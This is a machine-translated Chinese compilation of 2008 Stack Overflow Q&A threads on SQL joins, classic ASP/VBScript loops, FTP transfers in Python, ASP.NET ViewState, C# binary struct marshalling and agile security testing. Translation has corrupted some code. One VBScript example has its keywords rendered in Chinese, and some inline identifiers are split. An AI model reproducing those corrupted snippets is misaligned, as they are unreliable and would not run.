> ID：2267
> 
> 赞同：15
> 
> 时间：2008-08-05T13:17:46.830
> 
> 标签：c#, .net

我正在构建一个网页，向客户展示他们购买了哪些软件，并为他们提供下载所述软件的链接。不幸的是，关于购买内容的数据和下载信息位于不同的数据库中，因此我不能只通过 SQL 查询中的连接来处理它。

常见的项目是 SKU。我将从客户购买数据库中提取 SKU 列表，在下载表中是与该下载相关的 SKU 的逗号分隔列表。目前，我的意图是从这个数据表创建以填充`GridView`.

任何关于如何有效地做到这一点的建议将不胜感激。`DataSet`如果它有帮助，我可以很容易地将数据作为 a或 a拉回`DataReader`，如果其中一个对这个目的更好的话。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-08-05T13:48:19.950

只要这两个数据库位于同一物理服务器上（假设为 MSSQL）并且连接字符串中使用的用户名/密码对这两个数据库都具有权限，那么您应该能够跨两个数据库执行连接。例子：

```
select p.Date,
       p.Amount,
       d.SoftwareName,
       d.DownloadLink
from   PurchaseDB.dbo.Purchases as p
join   ProductDB.dbo.Products as d on d.sku = p.sku
where  p.UserID = 12345 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-08-05T14:06:44.483

为什么不创建一个基于域对象的方法来解决这个问题：

```
public class CustomerDownloadInfo
{
    private string sku;
    private readonly ICustomer customer;

    public CustomerDownloadInfo(ICustomer Customer){
        customer = Customer;
    }

    public void AttachSku(string Sku){
        sku = Sku;
    }

    public string Sku{
        get { return sku; }
    }

    public string Link{
        get{    
            // etc... etc...          
        }
    }
} 
```

这方面有一百万种变化，但是一旦您汇总了这些信息，它会更容易呈现吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-08-05T13:24:43.023

我在这里胡思乱想。如果您将两者作为数据表加载到相同的数据集中，并通过 SKU 定义两者之间的关系，然后对产生所需结果的数据集运行查询。

# visual-studio - 将自定义标记添加到 Visual Studio 验证

> ID：2279
> 
> 赞同：19
> 
> 时间：2008-08-05T13:24:11.763
> 
> 标签：visual-studio

如何将规则添加到 Visual Studio（2005 及更高版本）以验证供应商专有控件的属性标记 (HTML)？

我的客户端使用一个控件，该控件需要在 aspx 文件中将多个属性设置为标签，这会在每次构建时生成类似 215 的验证错误。这并没有阻止我构建，但真正的错误会在噪音中消失。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-08-05T13:43:27.387

右键单击 HTML / ASP 页面的源视图并选择“格式化和验证”。

1.  单击“标记特定选项”。
2.  展开“客户端 HTML 标记”并选择标题。
3.  点击“新标签...”。
4.  只需填写即可！

我希望我也可以添加自定义 CSS 值。

# asp-classic - 如何在经典 ASP 中遍历集合？

> ID：2300
> 
> 赞同：16
> 
> 时间：2008-08-05T13:30:46.290
> 
> 标签：asp-classic, vbscript

我希望能够做到：

```
For Each thing In things
End For 
```

经典 ASP - 不是 .NET！

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-08-11T12:39:46.320

像这样的东西？

```
dim cars(2),x
cars(0)="Volvo"
cars(1)="Saab"
cars(2)="BMW"

For Each x in cars
  response.write(x & "<br />")
Next 
```

请参阅[www.w3schools.com](http://web.archive.org/web/20140305020029/http://www.w3schools.com/vbscript/vbscript_looping.asp)。

如果要关联键和值，请[改用字典对象](http://www.4guysfromrolla.com/webtech/102898-1.shtml)：

```
Dim objDictionary
Set objDictionary = CreateObject("Scripting.Dictionary")
objDictionary.Add "Name", "Scott"
objDictionary.Add "Age", "20"
if objDictionary.Exists("Name") then
    ' Do something
else
    ' Do something else 
end if 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-08-05T13:42:15.593

无论您的 [事物] 需要在 VBScript 之外编写。

在 VB6 中，[您可以编写一个自定义集合类](http://www.vb-helper.com/howto_custom_collection_with_for_each.html)，然后您需要编译为 ActiveX DLL 并在您的网络服务器上注册它以访问它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-09-16T19:09:44.407

您将获得的最接近的是使用字典（如 Pacifika 所述）

```
Dim objDictionary
Set objDictionary = CreateObject("Scripting.Dictionary")
objDictionary.CompareMode = vbTextCompare 'makes the keys case insensitive'
objDictionary.Add "Name", "Scott"
objDictionary.Add "Age", "20" 
```

但我像收藏一样循环浏览我的字典

```
For Each Entry In objDictionary
  Response.write objDictionary(Entry) & "<br />"
Next 
```

您可以通过这种方式循环遍历整个字典，写出如下所示的值：

```
Scott
20 
```

你也可以这样做

```
For Each Entry In objDictionary
  Response.write Entry & ": " & objDictionary(Entry) & "<br />"
Next 
```

哪个会产生

```
 Name: Scott
 Age: 20 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-11-23T04:40:57.337

我以前使用过的一种方法是使用集合的一个属性，该属性返回一个数组，可以迭代。

```
Class MyCollection
    Public Property Get Items
        Items = ReturnItemsAsAnArray()
    End Property
    ...
End Class 
```

像这样迭代：

```
Set things = New MyCollection
For Each thing in things.Items
    ...
Next 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-23T06:15:19.207

正如布雷特所说，最好使用 vb 组件来创建集合。除非基于特定需要的应用程序，否则字典对象在 ASP 中不是很常用。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-05-21T08:43:36.047

使用 VB 脚本字典对象时要非常小心！
刚刚发现这个“***自动生存***”的东西，这个对象是原生的：http://en.wikipedia.org/wiki/Autovivification

因此，当您需要比较值时，切勿使用布尔比较，例如：
`If objDic.Item("varName") <> "" Then`...
这将**自动**将键“ `varName`”添加到字典中（如果它不存在，则为空值），以便进行评估布尔表达式。

如果需要，请改用`If objDic.Exists("varName")`.

只需花几天时间敲墙，使用此 Microsoft“*功能*”...
[vbscript-dictionary-object-creating-a-key-which-never-existed-but-present-in-another-object](http://social.technet.microsoft.com/Forums/scriptcenter/en-US/906ecc76-f0c2-4823-be2a-fb5eaf8179fd/vbscript-dictionary-object-creating-a-key-which-never-existed-but-present-in-another-object)

# asp.net - ASP.NET 显示 SVN 修订号

> ID：2308
> 
> 赞同：18
> 
> 时间：2008-08-05T13:38:42.310
> 
> 标签：asp.net, svn

我在堆栈溢出页脚中看到显示了 SVN 修订号。这是自动化的吗？如果是，如何在 ASP.NET 中实现它？

*（可以接受其他语言的解决方案）*

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-08-05T13:47:00.077

确保文件有 s`vn:keywords "Rev Id"`然后放在`$Rev$`那里的某个地方。

请参阅[此问题及其答案](https://stackoverflow.com/q/163/10221765)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-08-11T20:02:09.530

在我们的持续集成设置中，我们使用`SVNRevisionLabeller`并将其中的变量传递给 MSBuild，以便在创建已编译的网站 dll 时使用。`GetCurrentAssembly()`然后在最终版本中可供 .NET 使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-08-11T20:50:19.340

在我的 Rails 应用程序中，我有一个秘密操作，它实际上是这样做的：

```
render :text => `svn info #{RAILS_ROOT}` 
```

这相当于`Process.Start( "svn info..." )`如果您只熟悉`.NET`)

如果我想知道管理服务器的人最近是否更新了站点，我可以点击这个 URL 并查看一下。

# php - 通过 FTP 将文件复制到服务器后的文件大小差异

> ID：2311
> 
> 赞同：46
> 
> 时间：2008-08-05T13:40:47.470
> 
> 标签：php, python, ftp, webserver, ftplib

我创建了一个 PHP 脚本来更新位于本地目录中的 Web 服务器。我正在将脚本迁移到 Python 中。它在大多数情况下都可以正常工作，但是在执行 PUT 命令之后，文件的大小似乎发生了变化。因此，文件的大小与服务器上文件的大小不同。

一旦我再次从 FTP 服务器下载文件，唯一的区别就是 CR/LF 标记。这让我很恼火，因为同一个脚本正在比较要更新的文件的大小。此外，如果它意味着什么，该脚本可以通过 ftp_put 在 PHP 中完美运行。

```
from ftplib import FTP

ftpserver = "myserver"
ftpuser = "myuser"
ftppass = "mypwd"

locfile =  "g:/test/style.css"
ftpfile =  "/temp/style.css"

try:
    ftp = FTP(ftpserver, ftpuser, ftppass)
except:
    exit ("Cannot connect")

f = open (locfile, "r")
try:
    ftp.delete (ftpfile)
except:
    pass

# ftp.sendcmd ("TYPE I")
# ftp.storlines("STOR %s" % ftpfile, f)
ftp.storbinary("STOR %s" % ftpfile, f)
f.close()

ftp.dir (ftpfile)
ftp.quit() 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-08-05T13:45:38.413

您需要使用二进制文件打开 locfile`rb`吗？

```
f = open (locfile, "rb") 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-08-05T13:45:47.867

好吧，如果您在 Windows 或 *nix 环境中查看文件的属性，您会注意到两种大小。一个是扇区大小，一个是实际大小。扇区大小是硬盘上已用完的扇区数（以字节为单位）。这是因为对于大多数现代文件系统，两个文件不能位于同一扇区，因此如果您的文件填满了扇区的一半，则整个扇区将被标记为已填充。

因此，您可能会将扇区文件大小与 FTP 服务器上的实际文件大小进行比较，反之亦然。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-08-05T15:59:24.773

无论大小如何，小文件都会占用文件系统上的整个节点。

我的主机倾向于在 ftp 中将所有小文件报告为 4KB，但在 shell 中给出了准确的大小，因此它可能是 ftp 客户端常见的“功能”。

# asp.net - 使用 ASP.NET AJAX / ICallbackEventHandler 跟踪状态

> ID：2328
> 
> 赞同：13
> 
> 时间：2008-08-05T13:52:12.720
> 
> 标签：asp.net, ajax, asp.net-ajax, viewstate

我在维护 ASP.NET AJAX 页面中的状态时遇到问题。简短版本：在进行异步回调后，我需要一些方法来更新页面 ViewState，以反映服务器在异步调用期间所做的任何状态更改。

这似乎是一个常见问题，但我将描述我的场景以帮助解释：

我有一个类似网格的控件，它具有一些 JavaScript 增强功能——即拖放列和行的能力。当一列或一行被放到一个新位置时，调用一个 AJAX 方法来通知控制服务器端并触发相应的服务器端事件（“OnColumnMoved”或“OnRowMoved”）。

默认情况下，ASP.NET AJAX 调用将整个页面作为请求发送。这样页面会经历一个完整的生命周期，视图状态会被持久化，并且控件的状态会在调用 RaiseCallbackEvent 方法之前恢复。

但是，由于 AJAX 调用不会更新页面，因此 ViewState 会反映控件的*原始*状态，即使在移动列或行之后也是如此。因此，第二次发生客户端操作时，AJAX 请求会发送到服务器，并且页面和控件会重新构建以反映控件的*第一个*状态，而不是移动第一列或第一行之后的状态。

这个问题延伸到许多方面。例如，如果我们有一个客户端/AJAX 操作来向网格添加一个新项目，然后拖动一行，则网格是在服务器端构建的，比客户端少一个项目。

最后，对于我的具体示例，最重要的是，我们正在操作的实际数据源对象存储在页面 ViewState 中。这是一个设计决定，允许保留被操纵数据的有状态副本，这些副本可以在多次操作后提交给 DB，或者在用户退出时丢弃。这是很难改变的。

因此，再次，我需要一种方法来在触发 AJAX 方法后在回调时更新页面 ViewState。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-08-07T16:19:34.683

如果您已经在调整 ViewState，那么您不妨使用 UpdatePanel。它的部分回发**将**自动更新页面的 ViewState。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-08-05T14:25:19.750

查看这篇博文：[调整 ICallbackEventHandler 和 Viewstate](http://www.reimers.dk/blogs/jacob_reimers_weblog/archive/2007/03/23/tweaking-the-icallbackeventhandler-and-viewstate.aspx)。作者似乎正在解决您遇到的情况：

> 因此，当使用 ICallbackEventHandler 时，您需要克服两个障碍来更新回调的状态管理。首先是只读视图状态的问题。另一个实际上是在触发回调之前注册用户对页面所做的更改。

有关如何解决此问题的建议，请参阅博客文章。另请查看此[论坛帖子](http://forums.asp.net/t/1128218.aspx)，其中也讨论了相同的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-08-05T14:54:23.670

我实际上找到了您提供的两个链接，但如前所述，它们只是描述问题，而不是解决问题。博客文章的作者建议使用不同的 ViewState 提供程序来解决此问题，但不幸的是，在这种情况下这是不可能的......我真的需要单独留下 ViewState 的细节，只关注正在做的事情盒子外面。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-08-08T04:18:51.737

[我使用Telerik 的 RadAjaxManager](http://www.telerik.com/demos/aspnet/prometheus/Ajax/Examples/Common/ViewState/DefaultCS.aspx)找到了一个相当优雅的解决方案。它工作得很好。本质上，您注册每个可能调用回发的控件，然后注册每个应该在异步执行回发后重新绘制的控件。将`RadAjaxManager`在异步回发后更新 DOM 并重写`ViewState`所有受影响的控件。看过之后`Reflector`，引擎盖下看起来有点笨拙，但它适合我的目的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-08-08T04:56:31.880

当内置的 ASP.NET AJAX UpdatePanel 做同样的事情时，我不明白你为什么要为此使用自定义控件。

它只会增加更多复杂性，为您提供更少的支持，并使其他人更难以在您的应用程序上工作。

# macos - 如何在 Mac 上的 TextWrangler 中默认打开行号？

> ID：2332
> 
> 赞同：23
> 
> 时间：2008-08-05T13:57:05.033
> 
> 标签：macos, textwrangler

我厌倦了每次打开应用程序时都必须打开它们。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2008-08-05T13:57:10.027

转到 TextWrangler > 首选项。

在类别窗格中选择文本状态显示，然后选中“显示行号”选项并关闭首选项。现在，当您打开现有文档时，这应该默认启用。

# arrays - 在 Classic Asp VBScript 中遍历数组的最佳方法是什么？

> ID：2348
> 
> 赞同：40
> 
> 时间：2008-08-05T14:07:58.913
> 
> 标签：arrays, asp-classic, vbscript

在下面的代码中

```
For i = LBound(arr) To UBound(arr) 
```

问 using 有什么意义`LBound`？当然，这始终是 0。

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2008-08-05T14:36:12.693

为什么不使用`For Each`？这样你就不需要关心`LBound`and`UBound`是什么了。

```
Dim x, y, z
x = Array(1, 2, 3)

For Each y In x
    z = DoSomethingWith(y)
Next 
```

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2008-09-23T15:24:11.637

有充分的理由**不使用`For i = LBound(arr) To UBound(arr)`**

`dim arr(10)`分配数组的 11 个成员，从 0 到 10（假设 VB6 默认选项基）。

许多 VB6 程序员假定数组是基于 1 的，并且从不使用分配的`arr(0)`. `For i = 1 To UBound(arr)`我们可以通过使用or来消除潜在的 bug 来源`For i = 0 To UBound(arr)`，因为这样就很清楚是否`arr(0)`正在使用。

`For each`复制每个数组元素，而不是指针。

这有两个问题。

1.  当我们尝试为数组元素赋值时，它不会反映在原始元素上。此代码将值 47 分配给变量`i`，但不影响 的元素`arr`。

    ```
    arr = 数组（3,4,8）
    对于 arr 中的每个 i
         我 = 47
    接下来我
    Response.Write arr(0) ' - 返回 3，而不是 47
    ```

2.  我们不知道 中的数组元素的索引，`for each`也不能保证元素的顺序（尽管它似乎是有序的）。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-09-24T18:24:40.273

`LBound`可能并不总是 0。

虽然在 VBScript 中无法创建除 0 下限以外的任何内容的数组，但仍然可以从可能指定了不同`LBound`.

也就是说，我从来没有遇到过这样的人。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-08-05T14:24:13.653

可能它来自VB6。因为使用VB6 中的[Option Base](http://msdn.microsoft.com/en-us/library/aa266179(VS.60).aspx)语句，您可以像这样更改数组的下限：

```
Option Base 1 
```

同样在 VB6 中，您可以像这样更改特定数组的下限：

```
Dim myArray(4 To 42) As String 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-08-12T14:34:32.560

我一直使用 For Each 循环。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-06-30T02:32:29.950

这是我的方法：

```
dim arrFormaA(15)
arrFormaA( 0 ) = "formaA_01.txt"
arrFormaA( 1 ) = "formaA_02.txt"
arrFormaA( 2 ) = "formaA_03.txt"
arrFormaA( 3 ) = "formaA_04.txt"
arrFormaA( 4 ) = "formaA_05.txt"
arrFormaA( 5 ) = "formaA_06.txt"
arrFormaA( 6 ) = "formaA_07.txt"
arrFormaA( 7 ) = "formaA_08.txt"
arrFormaA( 8 ) = "formaA_09.txt"
arrFormaA( 9 ) = "formaA_10.txt"
arrFormaA( 10 ) = "formaA_11.txt"
arrFormaA( 11 ) = "formaA_12.txt"
arrFormaA( 12 ) = "formaA_13.txt"
arrFormaA( 13 ) = "formaA_14.txt"
arrFormaA( 14 ) = "formaA_15.txt"

Wscript.echo(UBound(arrFormaA))
''displays "15"

For i = 0 To UBound(arrFormaA)-1
    Wscript.echo(arrFormaA(i))
Next 
```

希望能帮助到你。

# macos - 如何将焦点放在 Mac OSX 中的下拉字段上

> ID：2349
> 
> 赞同：21
> 
> 时间：2008-08-05T14:07:58.930
> 
> 标签：macos, mouse, keyboard-shortcuts

在 Windows 中，在任何 Windows 表单或 Web 浏览器中，您都可以使用选项卡按钮在所有表单域中切换焦点。

它将在文本框、单选按钮、复选框、下拉菜单等处停止。

但是，在 Mac OSX 中，选项卡会跳过下拉菜单。有没有办法改变这种行为，或者在不使用鼠标的情况下访问上述项目？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2008-08-05T14:13:12.740

转到系统偏好设置 > 键盘和鼠标，然后选择键盘快捷键。在底部，确保完全键盘访问设置为“所有控件”。我已经很久没有打开它了，但我认为这就是你需要做的所有事情

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-08-05T14:13:58.153

Apple 菜单 > 系统偏好设置 > 键盘和鼠标 > 键盘快捷键：

将底部的单选按钮从“仅限文本框和列表”更改为“所有控件”。

编辑：该死。我们在这里是一个快速的团队，不是吗？:-)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-08-21T21:13:31.953

我发现我还需要`accessibility.tabfocus`在 Firefox 的`about:config`.

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2008-08-05T14:23:14.170

它在系统偏好设置中——[这篇博](http://www.howtogeek.com/howto/apple/why-doesnt-tab-work-for-drop-down-controls-in-firefox-on-os-x/)文显示了设置的位置。

# haskell - 谁能解释一下Monads？

> ID：2366
> 
> 赞同：79
> 
> 时间：2008-08-05T14:16:02.720
> 
> 标签：haskell, functional-programming, monads, glossary

> **可能重复：**
> [什么是单子？](https://stackoverflow.com/questions/44965/what-is-a-monad)

我想我明白什么是'Maybe Monads'，但我不确定其他类型。

# c# - 将二进制文件读入结构

> ID：2384
> 
> 赞同：59
> 
> 时间：2008-08-05T14:28:57.607
> 
> 标签：c#, struct, io, binaryfiles

我正在尝试使用 C# 读取二进制数据。我拥有我想要阅读的文件中有关数据布局的所有信息。我能够“逐块”读取数据，即获取前 40 个字节的数据将其转换为字符串，然后获取接下来的 40 个字节。

由于数据至少有三个略有不同的版本，我想直接将数据读入一个结构。感觉比“逐行”阅读要正确得多。

**我尝试了以下方法但无济于事：**

```
StructType aStruct;
int count = Marshal.SizeOf(typeof(StructType));
byte[] readBuffer = new byte[count];
BinaryReader reader = new BinaryReader(stream);
readBuffer = reader.ReadBytes(count);
GCHandle handle = GCHandle.Alloc(readBuffer, GCHandleType.Pinned);
aStruct = (StructType) Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(StructType));
handle.Free(); 
```

该流是一个打开的 FileStream，我已经开始从中读取。使用时我得到一个`AccessViolationExceptio`n `Marshal.PtrToStructure`。

由于我对文件末尾的数据不感兴趣，因此该流包含的信息比我尝试读取的要多。

**结构定义如下：**

```
[StructLayout(LayoutKind.Explicit)]
struct StructType
{
    [FieldOffset(0)]
    public string FileDate;
    [FieldOffset(8)]
    public string FileTime;
    [FieldOffset(16)]
    public int Id1;
    [FieldOffset(20)]
    public string Id2;
} 
```

示例代码从原始代码更改为使此问题更短。

如何将文件中的二进制数据读入结构？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2008-08-21T19:02:50.507

问题是结构中的**字符串**s。我发现像 byte/short/int 这样的编组类型不是问题；但是当您需要编组为诸如字符串之类的复杂类型时，您需要您的结构显式地模仿非托管类型。您可以使用 MarshalAs 属性执行此操作。

对于您的示例，以下内容应该有效：

```
[StructLayout(LayoutKind.Explicit)]
struct StructType
{
    [FieldOffset(0)]
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
    public string FileDate;

    [FieldOffset(8)]
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
    public string FileTime;

    [FieldOffset(16)]
    public int Id1;

    [FieldOffset(20)]
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 66)] //Or however long Id2 is.
    public string Id2;
} 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2010-11-02T02:40:14.273

这是我正在使用的。
这对我阅读 Portable Executable Format 很成功。
这是一个通用函数，**`T`**您的`struct`类型也是如此。

```
public static T ByteToType<T>(BinaryReader reader)
{
    byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

    GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
    handle.Free();

    return theStructure;
} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2010-05-06T01:04:40.047

正如 Ronnie 所说，我会使用 BinaryReader 并单独读取每个字段。我找不到包含此信息的文章的链接，但据观察，如果结构包含少于 30-40 个左右的字段，则使用 BinaryReader 读取每个单独的字段可能比 Marshal.PtrToStruct 更快。当我找到它时，我会发布文章的链接。

文章链接在： http: [//www.codeproject.com/Articles/10750/Fast-Binary-File-Reading-with-C](http://www.codeproject.com/Articles/10750/Fast-Binary-File-Reading-with-C)

在编组结构数组时，PtrToStruct 会更快地占上风，因为您可以将字段计数视为字段 * 数组长度。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-08-05T15:31:43.330

我认为您的代码没有任何问题。

就在我的脑海里，如果你尝试手动做呢？它有效吗？

```
BinaryReader reader = new BinaryReader(stream);
StructType o = new StructType();
o.FileDate = Encoding.ASCII.GetString(reader.ReadBytes(8));
o.FileTime = Encoding.ASCII.GetString(reader.ReadBytes(8));
...
...
... 
```

也试试

```
StructType o = new StructType();
byte[] buffer = new byte[Marshal.SizeOf(typeof(StructType))];
GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
Marshal.StructureToPtr(o, handle.AddrOfPinnedObject(), false);
handle.Free(); 
```

然后在 BinaryReader 中使用**buffer[]**而不是从 FileStream 读取数据，以查看是否仍然出现 AccessViolation 异常。

> 我没有使用 BinaryFormatter，我想我必须有一个与文件内容完全匹配的完整结构。

这是有道理的，BinaryFormatter 有自己的数据格式，与您的完全不兼容。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-08-06T09:03:28.277

我没有使用 BinaryFormatter，我想我必须有一个与文件内容完全匹配的完整结构。我意识到最终我对文件内容并不感兴趣，所以我采用了将部分流读取到字节缓冲区然后使用转换它的解决方案

```
Encoding.ASCII.GetString() 
```

对于字符串和

```
BitConverter.ToInt32() 
```

对于整数。

稍后我将需要能够解析更多文件，但对于这个版本，我只用了几行代码就成功了。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-08-05T14:56:10.937

尝试这个：

```
using (FileStream stream = new FileStream(fileName, FileMode.Open))
{
    BinaryFormatter formatter = new BinaryFormatter();
    StructType aStruct = (StructType)formatter.Deserialize(filestream);
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-23T21:43:29.523

直接读入结构是邪恶的——许多 C 程序由于不同的字节顺序、不同的字段编译器实现、打包、字长而失败......

您最擅长逐字节序列化和反序列化。如果您愿意或只是习惯 BinaryReader，请使用内置的东西。

# language-agnostic - 二进制文件布局参考

> ID：2405
> 
> 赞同：11
> 
> 时间：2008-08-05T14:45:17.463
> 
> 标签：language-agnostic, data-structures, file, binary

关于二进制文件布局结构的一些好的信息来源在哪里？

如果我想提取`BTrieve`索引文件、解析`MP3`标题等。从哪里获得可靠的信息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-08-05T14:47:18.227

我不确定是否有此类信息的一般信息来源。我总是在谷歌或维基百科上搜索那个特定的文件类型。应包括二进制文件布局结构信息。

例如 http://en.wikipedia.org/wiki/MP3#File_structure">MP3 文件布局结构

# sql-server - 您是否遇到过 SQL Server 因为引用了太多表而无法执行的查询？

> ID：2432
> 
> 赞同：20
> 
> 时间：2008-08-05T14:54:03.470
> 
> 标签：sql-server, database, sql-server-2005, sql-server-2000

您是否见过任何错误消息？

> -- SQL Server 2000
> 
> 无法为视图或函数解析分配辅助表。
> 已超出查询中的最大表数 (256)。
> 
> -- SQL Server 2005
> 
> 查询中的表名过多。允许的最大值为 256。

如果是，你做了什么？

放弃了？说服客户简化他们的需求？非规范化数据库？

* * *

@（希望我发布查询的每个人）：

1.  我不确定是否可以在答案编辑窗口中粘贴 70 KB 的代码。
2.  即使我可以这样做，这也无济于事，因为这 70 KB 的代码将引用 20 或 30 个我也必须发布的视图，否则代码将毫无意义。

我不想听起来像我在这里吹嘘，但问题不在于查询。查询是最佳的（或至少几乎是最佳的）。我花了无数个小时优化它们，寻找可以删除的每一列和每一个表。想象一个包含 200 或 300 列的报表，必须用单个 SELECT 语句填充（因为几年前它还是一个小型报表时就是这样设计的）。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-08-05T15:19:41.187

对于 SQL Server 2005，我建议您使用表变量并随时构建部分数据。

为此，请创建一个表变量，该变量代表您要发送给用户的最终结果集。

然后找到您的主表（例如上面示例中的订单表）并提取该数据，加上一些补充数据，仅表示一次连接（客户名称，产品名称）。您可以执行 SELECT INTO 将其直接放入表变量中。

从那里，遍历表并为每一行执行一堆小的 SELECT 查询，检索结果集所需的所有补充数据。随时将这些插入每一列。

完成后，您可以从表变量中执行简单的 SELECT * 并将此结果集返回给用户。

我对此没有任何确切的数字，但是到目前为止，我已经处理了三个不同的实例，其中执行这些较小的查询实际上比执行带有一堆连接的大规模选择查询更快。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-08-05T14:57:40.763

我从来没有遇到过这种情况，老实说，在查询中引用 > 256 个表的想法让我充满了致命的恐惧。

您的第一个问题可能应该是“为什么这么多？”，紧随其后的是“我不需要哪些信息*？* ” 我担心从这样的查询返回的数据量也会开始严重影响应用程序的性能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-08-05T15:19:18.363

@chopeen您可以更改计算这些统计信息的方式，而是保留所有每个产品统计信息的单独表格。下订单时，循环浏览产品并更新统计信息表中的适当记录。这会将大量计算负载转移到结帐页面，而不是在运行报告时在一个巨大的查询中运行所有内容。当然，有些统计数据不会以这种方式发挥作用，例如在购买特定产品后跟踪客户的下一次购买。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-11-02T15:50:00.493

在为 SQL Server 2000 上运行的 Dynamics CRM 安装编写 Reporting Services 报告时，这种情况总是会发生。CRM 有一个很好的规范化数据架构，它会导致大量的连接。实际上有一个修补程序将限制从 256 提高到惊人的 260： http: [//support.microsoft.com/kb/818406](http://support.microsoft.com/kb/818406)（我们一直认为这是 SQL Server 团队的一个很好的笑话）。

正如 Dillie-O 所暗示的那样，解决方案是识别适当的“子连接”（最好是多次使用的）并将它们分解为临时表变量，然后在主连接中使用。这是一个主要的 PIA，经常会影响性能。我为你感到难过。

@Kevin，喜欢那件 T 恤——说明一切 :-)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-08-05T14:58:55.270

我想看看那个查询，但我想这是某种迭代器的问题，虽然我想不出任何可能的情况，但我敢打赌它来自一个糟糕的 while/case/cursor 或大量执行不力的观点。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-08-05T15:26:55.027

发布查询：D

此外，我觉得其中一个可能的问题可能是拥有大量（读取 200 多个）名称/值表，这些表可以浓缩成一个查找表。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2010-08-19T17:29:08.187

我遇到了同样的问题...我的开发框运行 SQL Server 2008（视图工作正常），但在生产环境中（使用 SQL Server 2005）视图却没有。我最终创建了视图以避免此限制，在引发错误的视图中使用新视图作为查询的一部分。

考虑到逻辑执行是一样的有点傻......

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-03-07T15:59:53.820

当我想创建一个视图时，在 SQL Server 2005（2008 年工作）中遇到了同样的问题。我通过创建存储过程而不是视图解决了这个问题。

# security - 是否有在敏捷开发商店中测试安全性的最佳实践？

> ID：2447
> 
> 赞同：11
> 
> 时间：2008-08-05T15:05:00.170
> 
> 标签：security, agile

关于敏捷开发，测试每个版本的安全性的最佳实践是什么？

如果是每月发布，是否有商店每个月都进行渗透测试？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-10T21:19:56.610

你的应用领域是什么？这取决于。

由于您使用了“敏捷”这个词，我猜它是一个网络应用程序。我有一个很好的简单答案给你。

去购买 Burp Suite 的副本（这是“burp”的排名第一的 Google 搜索结果——肯定认可！）；如果你等到 11 月，它会花费你 99 欧元，或约 180 美元，或 98 美元奥巴马美元。

Burp 用作 Web 代理。您使用 Firefox 或 IE 或其他任何方式浏览您的 Web 应用程序，它会收集您生成的所有点击量。这些命中被馈送到一个名为“Intruder”的功能，这是一个网络模糊器。Intruder 将计算出您提供给每个查询处理程序的所有参数。然后它将为每个参数尝试疯狂的值，包括 SQL、文件系统和 HTML 元字符。在典型的复杂表单帖子中，这将产生大约 1500 次点击，您将通过这些点击来识别可怕的——或者，更重要的是，在敏捷环境中，新的——错误响应。

在每次发布迭代时对 Web 应用程序中的每个查询处理程序进行模糊测试是您可以在不建立正式的“SDLC”并增加人数的情况下提高应用程序安全性的第一件事。除此之外，请查看主要 Web 应用安全热点的代码：

*   仅使用参数化的准备好的 SQL 语句；永远不要简单地连接字符串并将它们提供给您的数据库句柄。

*   将所有输入过滤到已知良好字符（alnum、基本标点符号）的白名单中，更重要的是，从查询结果中输出过滤数据以将 HTML 元字符“中和”为 HTML 实体（quot、lt、gt 等）。

